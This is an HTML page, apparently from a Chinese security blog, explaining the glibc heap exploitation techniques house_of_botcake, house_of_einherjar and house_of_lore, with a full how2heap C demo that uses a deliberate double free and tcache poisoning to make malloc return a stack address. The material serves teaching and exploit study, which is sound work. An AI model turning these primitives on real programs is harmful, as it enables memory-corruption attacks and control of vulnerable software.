@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html>
+    <head>
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+    <link rel="alternate icon" type="image/png" href="/img/favicon.png">
+    <title>Loora1N&#39;s Blog | 鹭雨 | </title>
+    
+<link rel="stylesheet" href="/css/reset.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/css/markdown.css">
+
+    
+<link rel="stylesheet" href="/css/fonts.css">
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div class="paper">
+            <div class="paper-main">
+                
+                    <div class="post-header">
+    <a class="logo" href="/">Loora1N&#39;s Blog | 鹭雨</a>
+    <a class="go-home" href="/">
+        <svg width="8" height="14" viewBox="0 0 8 14">
+            <path d="M7 1L1 7l6 6" stroke="#000" stroke-width="2" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"/>
+        </svg>
+    </a>
+</div>
+                
+                <div class="post-main">
+
+    
+    
+        <div class="post-main-title">
+            【how2heap】 botcake,einherjar,lore
+        </div>
+        <div class="post-meta">
+            2023-11-16
+        </div>
+        <div class="post-md">
+            <blockquote>
+<p>本系列将针对glibc2.31及glibc2.35两个版本进行讨论，其他版本可以根据特性进行类推，建议先对各种堆块的基本特性和数据结构做已了解之后进行学习。</p>
+</blockquote>
+<h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house_of_botcake"></a>house_of_botcake</h2><p>house_of_botcake利用的是块的分割，使得只存在uaf漏洞的前提下实现堆块的溢出,达到获取任意地址的目的，下面我们用how2heap中的例子进行理解。</p>
+<pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;stdint.h&gt;
+#include &lt;assert.h&gt;
+
+
+int main()
+&#123;
+    /*
+     * This attack should bypass the restriction introduced in
+     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d
+     * If the libc does not include the restriction, you can simply double free the victim and do a
+     * simple tcache poisoning
+     * And thanks to @anton00b and @subwire for the weird name of this technique */
+
+    // disable buffering so _IO_FILE does not interfere with our heap
+    setbuf(stdin, NULL);
+    setbuf(stdout, NULL);
+
+    // introduction
+    puts(&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;);
+    puts(&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;);
+    puts(&quot;This attack only relies on double free.\n&quot;);
+
+    // prepare the target
+    intptr_t stack_var[4];
+    puts(&quot;The address we want malloc() to return, namely,&quot;);
+    printf(&quot;the target address is %p.\n\n&quot;, stack_var);
+
+    // prepare heap layout
+    puts(&quot;Preparing heap layout&quot;);
+    puts(&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;);
+    intptr_t *x[7];
+    for(int i=0; i&lt;sizeof(x)/sizeof(intptr_t*); i++)&#123;
+        x[i] = malloc(0x100);
+    &#125;
+    puts(&quot;Allocating a chunk for later consolidation&quot;);
+    intptr_t *prev = malloc(0x100);
+    puts(&quot;Allocating the victim chunk.&quot;);
+    intptr_t *a = malloc(0x100);
+    printf(&quot;malloc(0x100): a=%p.\n&quot;, a); 
+    puts(&quot;Allocating a padding to prevent consolidation.\n&quot;);
+    malloc(0x10);
+    
+    // cause chunk overlapping
+    puts(&quot;Now we are able to cause chunk overlapping&quot;);
+    puts(&quot;Step 1: fill up tcache list&quot;);
+    for(int i=0; i&lt;7; i++)&#123;
+        free(x[i]);
+    &#125;
+    puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);
+    free(a);
+    
+    puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);
+    free(prev);
+    
+    puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;);
+    malloc(0x100);
+    /*VULNERABILITY*/
+    free(a);// a is already freed
+    /*VULNERABILITY*/
+    
+    // simple tcache poisoning
+    puts(&quot;Launch tcache poisoning&quot;);
+    puts(&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;);
+    intptr_t *b = malloc(0x120);
+    puts(&quot;We simply overwrite victim&#39;s fwd pointer&quot;);
+    b[0x120/8-2] = (long)stack_var;
+    
+    // take target out
+    puts(&quot;Now we can cash out the target chunk.&quot;);
+    malloc(0x100);
+    intptr_t *c = malloc(0x100);
+    printf(&quot;The new chunk is at %p\n&quot;, c);
+    
+    // sanity check
+    assert(c==stack_var);
+    printf(&quot;Got control on target/stack!\n\n&quot;);
+    
+    // note
+    puts(&quot;Note:&quot;);
+    puts(&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;);
+    puts(&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;);
+
+    return 0;
+&#125;
+</code></pre>
+<p>首先我们用7个chunk填满tcache</p>
+<pre><code class="c">// cause chunk overlapping
+puts(&quot;Now we are able to cause chunk overlapping&quot;);
+puts(&quot;Step 1: fill up tcache list&quot;);
+for(int i=0; i&lt;7; i++)&#123;
+    free(x[i]);
+&#125;
+</code></pre>
+<p>之后free掉同样大小的prev chunk和a chunk，这时他们会在unsorted bin内合并为一个大chunk</p>
+<pre><code>puts(&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;);
+free(a);
+
+puts(&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;);
+free(prev);
+</code></pre>
+<p>先申请一个chunk，然后利用uaf，对 a chunk再次free，让其进入tcache。此时，a chunk同时在tcache和unsorted bin 中。</p>
+<pre><code>puts(&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;);
+malloc(0x100);
+/*VULNERABILITY*/
+free(a);// a is already freed
+/*VULNERABILITY*/
+</code></pre>
+<p>此时如果我们申请一个大一点的chunk，比如0x120，那么就会把prev的指针返回回来，并且可以对a chunk进行溢出，进而更改a chunk的fd，bk等等。</p>
+<h2 id="house-of-einherjar"><a href="#house-of-einherjar" class="headerlink" title="house_of_einherjar"></a>house_of_einherjar</h2><p>house of einherjar是一种特殊的堆利用手段，在存在堆溢出可以更改下一个chunk的PREV_INUSE位时，可以利用free的堆块合并，使用这种方式实现任意地址的控制。</p>
+<p><img src="/img/article/how2heap1/backward_consolidate-1666247169487-3.png" alt="示意图"></p>
+<h3 id="溢出前状态"><a href="#溢出前状态" class="headerlink" title="溢出前状态"></a>溢出前状态</h3><p>假设溢出前状态如下</p>
+<p><img src="/img/article/how2heap1/einherjar_before_overflow.png" alt="img"></p>
+<h3 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h3><p>这里我们假设 p0 堆块一方面可以写 prev_size 字段，另一方面，存在 off by one 的漏洞，可以写下一个 chunk 的 PREV_INUSE 部分，那么</p>
+<p><img src="/img/article/how2heap1/einherjar_overflowing.png" alt="img"></p>
+<h3 id="溢出后"><a href="#溢出后" class="headerlink" title="溢出后"></a>溢出后</h3><p><strong>假设我们将 p1 的 prev_size 字段设置为我们想要的目的 chunk 位置与 p1 的差值</strong>。在溢出后，我们释放 p1，则我们所得到的新的 chunk 的位置 <code>chunk_at_offset(p1, -((long) prevsize))</code> 就是我们想要的 chunk 位置了。</p>
+<p>当然，需要注意的是，由于这里会对新的 chunk 进行 unlink ，因此需要确保在对应 chunk 位置构造好了 fake chunk 以便于绕过 unlink 的检测。</p>
+<p><img src="/img/article/how2heap1/einherjar_after_overflow-1666251341548-11.png" alt="img"></p>
+<p>在这种情况下，我们便可将fake chunk通过再次malloc获得</p>
+<h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house_of_lore"></a>house_of_lore</h2><p>House of Lore 可以实现分配任意指定位置的 chunk，从而修改任意地址的内存。</p>
+<p>实际过程就是控制smallbin的最后一个chunk的bk指针，以及fakechunk的fd指针完成双链表的构建既可两次malloc控制任意地址</p>
+
+        </div>
+
+    
+
+</div>
+                <div class="footer">
+    <span>Copyright © 2022 Loora1N&#39;s Blog | 鹭雨</span>
+    <span>Theme Designed By <a target="_blank" href="https://zheli.design/one-paper">這李設計</a></span>
+</div>
+
+
+<link rel="stylesheet" href="/css/a11y-dark.min.css">
+
+
+<script src="/js/highlight.min.js"></script>
+
+
+<script src="/js/highlightjs-line-numbers.js"></script>
+
+
+<script>
+    hljs.initHighlightingOnLoad();
+    hljs.initLineNumbersOnLoad();
+</script>
+
+            </div>
+        </div>
+    <!-- hexo injector body_end start -->
+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://python-github-calendar-api.vercel.app/api?Loora1N";
+            var git_color =['#ebedf0', '#fdcdec', '#fc9bd9', '#fa6ac5', '#f838b2', '#f5089f', '#c4067e', '#92055e', '#540336', '#48022f', '#30021f'];
+            var git_user ="Loora1N";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/about/'){
+                console.log('已挂载github calendar')
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body>
+</html>
